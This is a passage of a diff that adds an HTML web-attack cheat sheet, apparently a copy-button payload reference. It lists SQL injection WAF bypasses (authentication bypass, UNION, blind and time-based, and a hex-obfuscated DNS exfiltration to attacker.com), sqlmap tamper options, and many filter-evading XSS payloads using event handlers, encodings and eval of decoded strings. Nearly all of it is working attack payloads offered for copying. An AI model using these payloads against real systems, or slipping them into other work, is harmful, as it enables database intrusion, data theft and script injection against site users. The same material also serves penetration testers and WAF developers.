+<span class="cmd-line">SELECT/**/username/**/FROM/**/users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// MySQL inline comment &mdash; /*! */ = MySQL executable comment</span>
+<span class="cmd-line">SELECT/*!username*/FROM users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// MySQL versioned &mdash; Executes only if MySQL &gt;= 5.0.0</span>
+<span class="cmd-line">SELECT /*!50000username*/ FROM users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Single line comment &mdash; -- comments out rest of query</span>
+<span class="cmd-line">SELECT username FROM users--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Hash comment (MySQL) &mdash; # is MySQL single-line comment</span>
+<span class="cmd-line">SELECT username FROM users#</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Multi-space &mdash; Multiple spaces between keywords</span>
+<span class="cmd-line">SELECT%20%20%20username%20FROM%20users</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Nested inline &mdash; Comments inside keyword tokens</span>
+<span class="cmd-line">SE/**/LE/**/CT</span>
+</div><div class="group-label" style="color:#b060ff">Whitespace Alternatives</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Tab character &mdash; Tab as space in SQL queries</span>
+<span class="cmd-line">%09 (0x09)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Newline &mdash; Line feed as space</span>
+<span class="cmd-line">%0a (0x0a)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Carriage return &mdash; Carriage return as space</span>
+<span class="cmd-line">%0d (0x0d)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Form feed &mdash; Form feed as whitespace</span>
+<span class="cmd-line">%0c (0x0c)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Vertical tab &mdash; Vertical tab as whitespace</span>
+<span class="cmd-line">%0b (0x0b)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Non-breaking space &mdash; Non-breaking space in some parsers</span>
+<span class="cmd-line">%a0 (0xa0)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// NULL byte &mdash; NULL byte may split token detection</span>
+<span class="cmd-line">%00 (before keyword)</span>
+</div><div class="group-label" style="color:#b060ff">HTML/JS Comment Tricks</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTML comment in tag &mdash; Browser strips HTML comments</span>
+<span class="cmd-line">&lt;scr&lt;!--comment--&gt;ipt&gt;alert(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Conditional comment &mdash; IE conditional comment</span>
+<span class="cmd-line">&lt;![if !IE]&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;![endif]&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JS block comment &mdash; Comments in JS ignored</span>
+<span class="cmd-line">&lt;script&gt;/*bypass*/alert(1)/*end*/&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JS line comment &mdash; Line comment + newline</span>
+<span class="cmd-line">&lt;script&gt;//bypass\nalert(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte in HTML &mdash; Null byte before tag</span>
+<span class="cmd-line">%00&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#b060ff">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Reverse string &mdash; Build string without literals</span>
+<span class="cmd-line">String.fromCharCode(116,114,101,108,97) reversed</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s5" data-cat="s5">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128202;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#ff3c78">SQL INJECTION WAF BYPASS</div>
+      <div class="sec-desc">SQLi-specific WAF bypass techniques covering detection, union-based, blind, and authentication bypass payloads.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#ff3c78">Authentication Bypass</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Classic bypass &mdash; Most basic — often blocked</span>
+<span class="cmd-line">' OR 1=1--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// With comment variations &mdash; Comments as spaces</span>
+<span class="cmd-line">'/**/OR/**/1=1--  'OR(1=1)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// With encoding &mdash; URL-encoded whitespace</span>
+<span class="cmd-line">'%20OR%201=1--  '%09OR%091=1--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double quote variant &mdash; Double quote instead of single</span>
+<span class="cmd-line">" OR "1"="1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// No spaces version &mdash; Parentheses replace spaces</span>
+<span class="cmd-line">'OR(1)=(1)--  '||(1)=(1)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Scientific bypass &mdash; Scientific notation for numbers</span>
+<span class="cmd-line">0'OR(1e0)=(1e0)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte version &mdash; Null byte to confuse tokenizer</span>
+<span class="cmd-line">'%00OR'1'='1</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Hex value &mdash; Hex encoded condition</span>
+<span class="cmd-line">'OR 0x313d31--  (0x313d31 = '1=1')</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Case + comment &mdash; Mixed case with comment whitespace</span>
+<span class="cmd-line">'Or/**/1/**/=/**/1--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Nested query &mdash; Subquery in condition</span>
+<span class="cmd-line">' OR (SELECT 1 FROM dual WHERE 1=1)--</span>
+</div><div class="group-label" style="color:#ff3c78">UNION SELECT Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Comments in UNION &mdash; Split keywords with comments</span>
+<span class="cmd-line">UN/**/ION/**/SE/**/LECT NULL--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Case variation &mdash; Random case UNION SELECT</span>
+<span class="cmd-line">uNiOn SeLeCt null,null,null--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// URL encoded &mdash; # then newline as whitespace</span>
+<span class="cmd-line">UNION%23%0ASELECT%23%0Anull--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Scientific float &mdash; Float prefix on UNION</span>
+<span class="cmd-line">1.0UNION SELECT null--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// /*!UNION*/ version &mdash; MySQL executable comments</span>
+<span class="cmd-line">/*!UNION*//*!SELECT*/ null--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Line feed version &mdash; Newline as space</span>
+<span class="cmd-line">UNION%0ASELECT%0Anull--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Plus sign &mdash; Plus as space in URL</span>
+<span class="cmd-line">UNION+SELECT+null+FROM+users--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Parentheses &mdash; Wrapped in parentheses</span>
+<span class="cmd-line">(UNION)(SELECT)(null)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Double negation &mdash; Negative number forces error row</span>
+<span class="cmd-line">-1+UNION+SELECT+1,2,3--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Inline comment padding &mdash; Padding inside columns</span>
+<span class="cmd-line">UNION SELECT/*aaaa*/null/*bbbb*/,null--</span>
+</div><div class="group-label" style="color:#ff3c78">Blind SQLi Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SLEEP bypass (BENCHMARK) &mdash; Heavy CPU = time delay without SLEEP</span>
+<span class="cmd-line">AND BENCHMARK(10000000,SHA1(1))--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Conditional timing &mdash; Conditional time delay</span>
+<span class="cmd-line">AND IF(1=1,SLEEP(5),0)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Heavy query blind &mdash; Cartesian product for delay</span>
+<span class="cmd-line">AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Boolean with encoding &mdash; Hex-encoded boolean</span>
+<span class="cmd-line">AND 0x313d31--  (0x313d31 = 1=1)</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Error-based OOB &mdash; Error message exfil</span>
+<span class="cmd-line">AND extractvalue(1,concat(0x7e,(SELECT version())))--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// DNS exfil (MySQL) &mdash; OOB via LOAD_FILE UNC path</span>
+<span class="cmd-line">AND LOAD_FILE(concat(0x5c5c,(SELECT hex(version())),0x2e,0x61,0x74,0x74,0x61,0x63,0x6b,0x65,0x72,0x2e,0x63,0x6f,0x6d,0x5c,0x61))--</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Time via regex &mdash; SLEEP inside subquery</span>
+<span class="cmd-line">AND (SELECT * FROM (SELECT(SLEEP(5)))a)--</span>
+</div><div class="group-label" style="color:#ff3c78">SQLmap WAF Tamper Scripts</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Space to comment &mdash; Replaces space with /**/ comment</span>
+<span class="cmd-line">sqlmap --tamper=space2comment</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Random case &mdash; Randomizes keyword letter case</span>
+<span class="cmd-line">sqlmap --tamper=randomcase</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Charencode &mdash; URL-encodes all characters</span>
+<span class="cmd-line">sqlmap --tamper=charencode</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Chardoubleencode &mdash; Double URL-encodes all chars</span>
+<span class="cmd-line">sqlmap --tamper=chardoubleencode</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Between tamper &mdash; Replaces &gt; with NOT BETWEEN 0 AND</span>
+<span class="cmd-line">sqlmap --tamper=between</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Equaltolike &mdash; Replaces = with LIKE operator</span>
+<span class="cmd-line">sqlmap --tamper=equaltolike</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Space2dash &mdash; Replaces space with -- and newline</span>
+<span class="cmd-line">sqlmap --tamper=space2dash</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Combine tampers &mdash; Stack multiple tampers</span>
+<span class="cmd-line">sqlmap --tamper=space2comment,randomcase,charencode</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTMLencode &mdash; HTML-encodes payload</span>
+<span class="cmd-line">sqlmap --tamper=htmlencode</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ff3c78">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Apostrophemask &mdash; Replaces ' with %EF%BC%87 (fullwidth)</span>
+<span class="cmd-line">sqlmap --tamper=apostrophemask</span>
+</div>
+  </div>
+</div>
+<div class="sec-card" id="s6" data-cat="s6">
+  <div class="sec-header" onclick="toggleSec(this)">
+    <div class="sec-icon">&#128249;</div>
+    <div class="sec-title-block">
+      <div class="sec-title" style="color:#ffd700">XSS WAF BYPASS</div>
+      <div class="sec-desc">XSS payloads that bypass common WAF signatures using event handlers, encoding, alternative tags, and context manipulation.</div>
+    </div>
+    <span class="chev">&#9662;</span>
+  </div>
+  <div class="sec-body collapsed">
+    <div class="group-label" style="color:#ffd700">Tag &amp; Attribute Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SVG onload &mdash; SVG often missed by WAFs looking for &lt;script&gt;</span>
+<span class="cmd-line">&lt;svg onload=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// SVG/animate &mdash; SVG animation events</span>
+<span class="cmd-line">&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/animate&gt;&lt;/svg&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Details tag &mdash; HTML5 details ontoggle event</span>
+<span class="cmd-line">&lt;details open ontoggle=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Input autofocus &mdash; Focus event without user interaction</span>
+<span class="cmd-line">&lt;input autofocus onfocus=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Video source &mdash; onerror on video source</span>
+<span class="cmd-line">&lt;video&gt;&lt;source onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Img onerror &mdash; Classic — try variations if blocked</span>
+<span class="cmd-line">&lt;img src=x onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Body onpageshow &mdash; Page lifecycle event</span>
+<span class="cmd-line">&lt;body onpageshow=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Marquee &mdash; Legacy HTML element</span>
+<span class="cmd-line">&lt;marquee onstart=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Object data &mdash; Object tag with JS protocol</span>
+<span class="cmd-line">&lt;object data=javascript:alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Iframe srcdoc &mdash; Nested HTML in srcdoc</span>
+<span class="cmd-line">&lt;iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Math element &mdash; MathML namespace</span>
+<span class="cmd-line">&lt;math&gt;&lt;a xlink:href=javascript:alert(1)&gt;click&lt;/a&gt;&lt;/math&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Base href &mdash; Base tag JS URL</span>
+<span class="cmd-line">&lt;base href=javascript:/a/-alert(1)//&gt;</span>
+</div><div class="group-label" style="color:#ffd700">Event Handler Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onmouseover &mdash; Mouse event — common on links</span>
+<span class="cmd-line">&lt;a onmouseover=alert(1)&gt;hover&lt;/a&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onclick &mdash; Click event handler</span>
+<span class="cmd-line">&lt;a onclick=alert(1)&gt;click&lt;/a&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onpointerdown &mdash; HTML5 pointer event</span>
+<span class="cmd-line">&lt;x onpointerdown=alert(1)&gt;click&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onpointerenter &mdash; Pointer enter event</span>
+<span class="cmd-line">&lt;x onpointerenter=alert(1)&gt;hover&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ontouchstart &mdash; Mobile touch event</span>
+<span class="cmd-line">&lt;x ontouchstart=alert(1)&gt;touch&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onauxclick &mdash; Middle/right click event</span>
+<span class="cmd-line">&lt;x onauxclick=alert(1)&gt;right-click&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// oncut/oncopy &mdash; Clipboard events</span>
+<span class="cmd-line">&lt;x oncut=alert(1) contenteditable&gt;select and cut&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// ondrag &mdash; HTML5 drag events</span>
+<span class="cmd-line">&lt;x ondragstart=alert(1) draggable=true&gt;drag me&lt;/x&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// onfullscreenchange &mdash; Fullscreen API event</span>
+<span class="cmd-line">&lt;x onfullscreenchange=alert(1) onclick=this.requestFullscreen()&gt;click&lt;/x&gt;</span>
+</div><div class="group-label" style="color:#ffd700">Encoding Bypasses for XSS</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTML decimal entities &mdash; Decimal HTML entities in handler</span>
+<span class="cmd-line">&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// HTML hex entities &mdash; Hex HTML entities</span>
+<span class="cmd-line">&lt;img src=x onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JS Unicode escapes &mdash; Unicode in JS context</span>
+<span class="cmd-line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// JS hex escapes &mdash; Hex escapes in JS</span>
+<span class="cmd-line">&lt;script&gt;\x61\x6c\x65\x72\x74(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// String.fromCharCode &mdash; Build string from char codes</span>
+<span class="cmd-line">&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// atob base64 &mdash; atob() decodes base64 at runtime</span>
+<span class="cmd-line">&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Template literals &mdash; Template literal execution</span>
+<span class="cmd-line">&lt;script&gt;`${alert(1)}`&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Reversed string &mdash; Reversed payload string</span>
+<span class="cmd-line">&lt;script&gt;var x='(1)trelA';eval(x.split('').reverse().join(''))&lt;/script&gt;</span>
+</div><div class="group-label" style="color:#ffd700">WAF-Specific XSS Bypasses</div>
+<div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Broken tag &mdash; Extra &lt; confuses some WAFs</span>
+<span class="cmd-line">&lt;&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Extra angle brackets &mdash; Nested broken tags</span>
+<span class="cmd-line">&lt;scr&lt;ipt&gt;alert(1)&lt;/scr&lt;/ipt&gt;ipt&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Null byte in tag &mdash; Null byte before tag</span>
+<span class="cmd-line">%00&lt;script&gt;alert(1)&lt;/script&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Backtick attribute &mdash; Backtick instead of quote</span>
+<span class="cmd-line">&lt;img src=`x` onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// No quotes &mdash; Unquoted attribute value</span>
+<span class="cmd-line">&lt;img src=x onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Mixed quotes &mdash; Quote confusion</span>
+<span class="cmd-line">&lt;img src='x" onerror=alert(1) x='</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Capitalized tag &mdash; All caps tag name</span>
+<span class="cmd-line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Script in attribute &mdash; Mixed case event handler</span>
+<span class="cmd-line">&lt;img src=1 onError=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Space before = &mdash; Spaces around = in attribute</span>
+<span class="cmd-line">&lt;img src =x onerror= alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Tab in tag &mdash; Tab instead of space in tag</span>
+<span class="cmd-line">&lt;img	src=x	onerror=alert(1)&gt;</span>
+</div><div class="cmd-block" style="margin-bottom:6px;border-left-color:#ffd700">
+<button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+<span class="cmd-comment">// Newline in tag &mdash; Newline inside HTML tag</span>
